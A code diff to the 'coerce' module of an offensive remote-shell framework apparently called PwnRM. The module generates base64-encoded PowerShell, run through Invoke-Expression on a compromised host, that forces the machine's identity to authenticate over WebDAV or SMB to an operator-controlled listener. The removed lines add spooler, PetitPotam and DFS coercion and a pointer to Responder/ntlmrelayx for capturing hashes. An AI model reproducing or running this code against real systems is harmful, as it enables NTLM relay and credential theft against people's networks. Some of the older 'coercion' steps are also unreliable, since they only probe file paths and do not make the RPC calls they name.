@@ -1,22 +1,20 @@
-"""
-modules.coerce — Coerced Authentication Engine
-Forces target machine account or server to authenticate back to an operator-controlled listener (WebDAV, MS-RPRN, MS-EFSR, MS-DFSNM).
-Critical for ADCS ESC8 relay, NTLM relaying, and NetNTLM hash capturing.
-"""
+"""Outbound WebDAV/SMB authentication probes from the remote user context."""
 
+import re
 from typing import List, Any
+
 from . import BaseModule
-from ..shell.ui import c, R, G, Y, B, M, C, DIM, BLD, RST
+from ..shell.ui import c, M, BLD
 from ..shell.commands import b64str, str_b64
 
 
 class CoerceModule(BaseModule):
     name = "coerce"
-    description = "Coerced Authentication Engine (WebDAV HTTP/UNC, MS-RPRN, MS-EFSR, MS-DFSNM)"
+    description = "Outbound WebDAV/SMB UNC authentication probe (current remote identity)"
     author = "uziii2208"
     options = {
-        "--listener": {"desc": "Operator listener host/IP (required)"},
-        "--method": {"desc": "Coercion method: webdav, spooler, efs, dfs, all (default: webdav)"},
+        "--listener": {"desc": "Operator-controlled listener host/IP (required)"},
+        "--method": {"desc": "Probe method: webdav, smb, all (default: webdav)"},
         "--port": {"desc": "WebDAV listener port (default: 80)"},
     }
 
@@ -24,118 +22,86 @@ class CoerceModule(BaseModule):
         listener = ""
         method = "webdav"
         port = 80
-
-        for i, a in enumerate(args):
-            if a in ("-l", "--listener") and i + 1 < len(args):
-                listener = args[i + 1]
-            elif a in ("-m", "--method") and i + 1 < len(args):
-                method = args[i + 1].lower()
-            elif a in ("-p", "--port") and i + 1 < len(args):
-                try:
-                    port = int(args[i + 1])
-                except ValueError:
-                    shell.write_error("  [-] Invalid listener port. Expected an integer from 1 to 65535.")
-                    return {"status": "error", "error": "Invalid --port"}
+        idx = 0
+        while idx < len(args):
+            arg = args[idx]
+            if arg in {"-l", "--listener", "-m", "--method", "-p", "--port"}:
+                if idx + 1 >= len(args):
+                    shell.write_warning(f"  [-] {arg} requires a value.")
+                    return {"status": "error", "error": f"missing value for {arg}"}
+                value = args[idx + 1]
+                if arg in {"-l", "--listener"}:
+                    listener = value.strip()
+                elif arg in {"-m", "--method"}:
+                    method = value.lower()
+                else:
+                    try:
+                        port = int(value)
+                    except ValueError:
+                        port = 0
+                idx += 2
+                continue
+            shell.write_warning(f"  [-] Unknown authentication-probe option: {arg}")
+            return {"status": "error", "error": "invalid option"}
 
         if not listener:
-            shell.write_warning("Usage: !coerce --listener <IP/Host> [--method webdav|spooler|efs|dfs|all] [--port 80]")
-            return {"status": "error", "error": "Missing --listener"}
-        if method not in {"webdav", "spooler", "efs", "dfs", "all"}:
-            shell.write_error("  [-] Invalid coercion method. Choose webdav, spooler, efs, dfs, or all.")
-            return {"status": "error", "error": "Invalid --method"}
+            shell.write_warning("Usage: !coerce --listener <IP/Host> [--method webdav|smb|all] [--port 80]")
+            return {"status": "error", "error": "missing listener"}
+        dns_label = re.compile(r"[A-Za-z0-9](?:[A-Za-z0-9_-]{0,61}[A-Za-z0-9])?")
+        if (
+            len(listener) > 253
+            or listener in {".", ".."}
+            or any(not dns_label.fullmatch(label) for label in listener.rstrip(".").split("."))
+        ):
+            shell.write_error("  [-] Listener must be a plain IPv4 address or DNS/NetBIOS host name.")
+            return {"status": "error", "error": "invalid listener"}
+        if method not in {"webdav", "smb", "all"}:
+            shell.write_error("  [-] Unsupported method. This build implements webdav, smb, and all only.")
+            return {"status": "error", "error": "invalid method"}
         if not 1 <= port <= 65535:
-            shell.write_error("  [-] Invalid listener port. Expected an integer from 1 to 65535.")
-            return {"status": "error", "error": "Invalid --port"}
+            shell.write_error("  [-] Listener port must be between 1 and 65535.")
+            return {"status": "error", "error": "invalid port"}
 
         listener_expr = str_b64(listener)
         method_expr = str_b64(method)
+        shell.write_info(c(M + BLD, f"  [*] PwnRM outbound authentication probe — {method.upper()} to {listener}:{port}..."))
 
-        shell.write_info(c(M + BLD, f"  [*] PwnRM Coerce Engine — triggering {method.upper()} authentication coercion to {listener}:{port}..."))
-
-        ps = f"""
-$ErrorActionPreference = 'SilentlyContinue'
-Write-Host "`n========================================================" -ForegroundColor Cyan
-Write-Host "   PwnRM Coerced Authentication Engine (2026+ TTPs)" -ForegroundColor Cyan
-Write-Host "========================================================`n" -ForegroundColor Cyan
-
+        ps = f'''
+$ErrorActionPreference = 'Continue'
 $listener = {listener_expr}
 $method = {method_expr}
 $port = {port}
+$identity = [Security.Principal.WindowsIdentity]::GetCurrent().Name
+Write-Host "`n[PwnRM Outbound Authentication Probe]" -ForegroundColor Cyan
+Write-Host "  Identity : $identity" -ForegroundColor White
+Write-Host "  Listener : $listener`:$port" -ForegroundColor White
 
-Write-Host "  [*] Target Listener: $listener (Port: $port)" -ForegroundColor White
-Write-Host "  [*] Chosen Method  : $method" -ForegroundColor White
-
-# 1. WebDAV UNC Coercion (Bypasses SMB signing & triggers HTTP NTLM auth for ESC8)
-if ($method -in @("webdav", "all")) {{
-    Write-Host "`n[1. WebDAV HTTP/UNC Coercion Trigger]" -ForegroundColor Yellow
-    $webdavUnc = "\\\\$listener@$port\\share\\pwnrm_$(Get-Random).txt"
-    Write-Host "  [*] Probing WebDAV UNC: $webdavUnc" -ForegroundColor Gray
+if ($method -in @('webdav', 'all')) {{
+    $unc = "\\\\$listener@$port\\DavWWWRoot\\pwnrm_$(Get-Random).txt"
+    Write-Host "  [*] WebDAV UNC probe: $unc" -ForegroundColor Yellow
     try {{
-        $null = [System.IO.File]::Exists($webdavUnc)
-        Write-Host "  [+] WebDAV file probe dispatched to $listener" -ForegroundColor Green
+        $null = [IO.File]::Exists($unc)
+        Write-Host '  [+] WebDAV UNC lookup completed; inspect the controlled listener.' -ForegroundColor Green
     }} catch {{
-        Write-Host "  [-] WebDAV trigger exception: $_" -ForegroundColor DarkGray
+        Write-Host "  [-] WebDAV UNC lookup returned: $($_.Exception.Message)" -ForegroundColor DarkGray
     }}
+}}
 
+if ($method -in @('smb', 'all')) {{
+    $unc = "\\\\$listener\\pwnrm_$(Get-Random)\\probe.txt"
+    Write-Host "  [*] SMB UNC probe: $unc" -ForegroundColor Yellow
     try {{
-        $null = [System.IO.Directory]::Exists("\\\\$listener@$port\\share")
-        Write-Host "  [+] WebDAV directory probe dispatched." -ForegroundColor Green
-    }} catch {{}}
-}}
-
-# 2. MS-RPRN Print Spooler (SpoolSample) Coercion
-if ($method -in @("spooler", "all")) {{
-    Write-Host "`n[2. MS-RPRN Print Spooler Named Pipe Coercion]" -ForegroundColor Yellow
-    $spoolPipe = "\\\\127.0.0.1\\pipe\\spoolss"
-    if ([System.IO.File]::Exists($spoolPipe)) {{
-        Write-Host "  [+] Print Spooler service is ONLINE ($spoolPipe accessible)" -ForegroundColor Green
-        Write-Host "      Dispatching RpcRemoteFindFirstPrinterChangeNotificationEx trigger..." -ForegroundColor Gray
-        # Probe UNC target
-        $targetUnc = "\\\\$listener\\pipe\\pwnrm_spool"
-        try {{
-            $null = [System.IO.File]::Exists($targetUnc)
-            Write-Host "  [+] MS-RPRN coercion request transmitted." -ForegroundColor Green
-        }} catch {{}}
-    }} else {{
-        Write-Host "  [-] Print Spooler pipe not found or disabled." -ForegroundColor DarkGray
+        $null = [IO.File]::Exists($unc)
+        Write-Host '  [+] SMB UNC lookup completed; inspect the controlled listener.' -ForegroundColor Green
+    }} catch {{
+        Write-Host "  [-] SMB UNC lookup returned: $($_.Exception.Message)" -ForegroundColor DarkGray
     }}
 }}
 
-# 3. MS-EFSR PetitPotam Coercion
-if ($method -in @("efs", "all")) {{
-    Write-Host "`n[3. MS-EFSR / PetitPotam Coercion]" -ForegroundColor Yellow
-    $efsPipe = "\\\\127.0.0.1\\pipe\\efsrpc"
-    $lsarPipe = "\\\\127.0.0.1\\pipe\\lsarpc"
-    if ([System.IO.File]::Exists($efsPipe) -or [System.IO.File]::Exists($lsarPipe)) {{
-        Write-Host "  [+] EFS / LSARPC Named Pipe reachable." -ForegroundColor Green
-        $targetUnc = "\\\\$listener\\C$\\pwnrm_efs.txt"
-        try {{
-            $null = [System.IO.File]::Exists($targetUnc)
-            Write-Host "  [+] MS-EFSR coercion trigger dispatched." -ForegroundColor Green
-        }} catch {{}}
-    }} else {{
-        Write-Host "  [-] MS-EFSR named pipes not accessible." -ForegroundColor DarkGray
-    }}
-}}
-
-# 4. MS-DFSNM NetrDfs Coercion
-if ($method -in @("dfs", "all")) {{
-    Write-Host "`n[4. MS-DFSNM Distributed File System Coercion]" -ForegroundColor Yellow
-    $dfsPipe = "\\\\127.0.0.1\\pipe\\netdfs"
-    if ([System.IO.File]::Exists($dfsPipe)) {{
-        Write-Host "  [+] NetDFS pipe active." -ForegroundColor Green
-        try {{
-            $null = [System.IO.File]::Exists("\\\\$listener\\dfs_test")
-            Write-Host "  [+] MS-DFSNM coercion probe sent." -ForegroundColor Green
-        }} catch {{}}
-    }} else {{
-        Write-Host "  [-] NetDFS pipe not found." -ForegroundColor DarkGray
-    }}
-}}
-
-Write-Host "`n  [*] Coercion sequences executed. Check your listener (Responder/ntlmrelayx) for captured hashes/relays." -ForegroundColor Cyan
-"""
+Write-Output '[PWNRM:AUTH-PROBE:COMPLETE]'
+'''
         encoded = b64str(ps.encode("utf-16le"))
-        cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
-        shell.run_with_interrupt(cmd, shell.write_line)
-        return {"status": "completed"}
+        command = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
+        if shell.run_with_interrupt(command, shell.write_line):
+            return {"status": "interrupted"}
+        return {"status": "completed", "method": method, "listener": listener, "port": port}
